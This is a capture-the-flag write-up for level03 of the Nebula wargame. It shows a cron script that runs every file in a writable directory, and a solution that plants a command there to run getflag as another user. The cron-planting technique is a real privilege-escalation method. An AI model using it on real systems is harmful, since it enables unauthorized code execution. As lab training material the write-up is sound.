# Nebula
## level03
### Prompt
Check the home directory of flag03 and take note of the files there.

There is a crontab that is called every couple of minutes.

To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03.

### Solution
A crontab executes all files in ``/home/flag03/writable.d`` every 5 minutes before removing them.
```
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```

cron does not write on stdout so we redirect the output to a log file.
```shell
level03@nebula:/home/flag03$ echo "/bin/getflag > /tmp/flag.log" > writable.d/command
```

Wait for a few minutes.

```shell
level03@nebula:/home/flag03$ cat /tmp/flag.log
You have successfully executed getflag on a target account
```
